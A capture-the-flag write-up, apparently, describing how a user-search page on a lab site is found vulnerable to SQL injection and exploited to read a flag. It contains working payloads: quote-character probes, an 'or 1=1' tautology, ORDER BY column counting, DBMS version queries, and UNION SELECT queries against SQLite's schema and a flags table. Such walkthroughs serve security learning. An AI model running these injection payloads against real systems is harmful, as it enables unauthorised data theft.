![](../images/inbox1.png)
after visiting the website and clicking in search for user, we get one page which presente us 
a search input in order to search user by enter the name.
directly, i thought about **xss** or **sqli**. but after make some test, i  understand that the search functionality is vulnerable to sqli **SQL INJECTION **
how i know that?: i make some test.  
i order to test for sqli, we can input some char like (", ', `, (' , (", )  which will trigger an error if they are sqli vuln . see below
![](../images/inbox5.png)
i input **'** and i get error.
so let get users from the database:
**payload**: 'or '1' ='1' --
we get all the user;
![](../images/inbox2.png)
<br/>
we can fuger out that  the **union base sqli** is evalable
so let get the number of column.
payload: **'or '1' ='1'  ORDER BY  2--**
output: good we get all the user.
![](../images/inbox3.png)
<br/>
payload: **'or '1' ='1'  ORDER BY  3--**
output: good we get an error.
![](../images/inbox4.png)
conclusion: **the number of column is 2**

#now we need to know the type of DBMS the backend use. let make some test. 
in order to do that, i try to get dbms version by using some payload.
# from portswigger
 Oracle 	SELECT banner FROM v$version
SELECT version FROM v$instance
Microsoft 	SELECT @@version
PostgreSQL 	SELECT version()
MySQL 	SELECT @@version 

after try these payload and get alwayse an error, i try to test for *SQLITE* and that work
<br/>
payload:   **'or '1' ='1'  UNION SELECT null, sql FROM sqlite_schema--**
output: ** 
Results

- CREATE TABLE flags ( flag varchar(255) )

- CREATE TABLE users ( id int, email varchar(255) )

1 - alice@fakeinbox.com

2 - bob@fakeinbox.com

3 - charlie@fakeinbox.com**
so we see that the database have to table, users, and flags. the flags table is very important for use. 😅
so let dump all value from flags table:
payload: **'or '1' ='1'  UNION SELECT null, flag FROM flags--**
output: see picture below
![](../images/inbox6.png)
we get the fist part of the flag:
#  flag{off_to_a_good_start_
